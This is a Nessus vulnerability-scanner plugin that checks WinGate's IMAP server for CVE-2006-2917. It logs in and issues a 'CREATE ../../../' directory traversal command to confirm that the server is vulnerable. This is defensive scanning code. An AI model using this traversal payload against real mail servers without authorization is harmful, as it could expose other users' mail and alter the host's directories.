#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote IMAP server is prone to multiple directory traversal
vulnerabilities. 

Description :

The remote host appears to be running WinGate, a Windows application
for managing and securing Internet access. 

According to its banner, the version of WinGate installed on the
remote host fails to remove directory traversal sequences from the
'CREATE', 'SELECT', 'DELETE', 'RENAME', 'COPY', 'APPEND', and 'LIST'
commands before using them to access messages.  An authenticated
attacker may be able to exploit this issue to read mail belong to
other users and to create / rename / delete arbitrary directories on
the affected system. 

See also :

http://secunia.com/secunia_research/2006-48/advisory/
http://forums.qbik.com/viewtopic.php?t=4215

Solution :

Upgrade to WinGate 6.1.4 Build 1099 or later. 

Risk factor :

Low / CVSS Base Score : 2.7
(AV:R/AC:L/Au:R/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(22022);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2917");
  script_bugtraq_id(18908);

  script_name(english:"WinGate IMAP Server Directory Traversal Vulnerabilities");
  script_summary(english:"Checks version number in WinGate's banner");

  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like WinGate's, unless we're paranoid.
s = recv_line(socket:soc, length:1024);
if (
  report_paranoia < 2 &&
  (!strlen(s) || "* OK WinGate IMAP4rev1 service" >!< s)
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
#
# nb: SELECT seems to return OK regardless of whether the directory
#     actually exists in a vulnerable version. 
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  # Create a mailbox in the software's main directory.
  mailbox = string(SCRIPT_NAME, "-", unixtime());
  c = string("nessus", string(tag), " CREATE ../../../", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # There's a problem if we were successful; eg,
  # "OK CREATE folder created" vs "NO access denied".
  if (resp && resp =~ "OK" && "CREATE folder created" >< s) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to create the following directory on the remote\n",
        "host, under the directory in which WinGate is installed:\n",
        "\n",
        "  ", mailbox
      );
    }
    else report = desc;

    security_note(port:port, data:report);
  }
}
else if (resp =~ "BAD" || resp =~ "NO") {
  if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
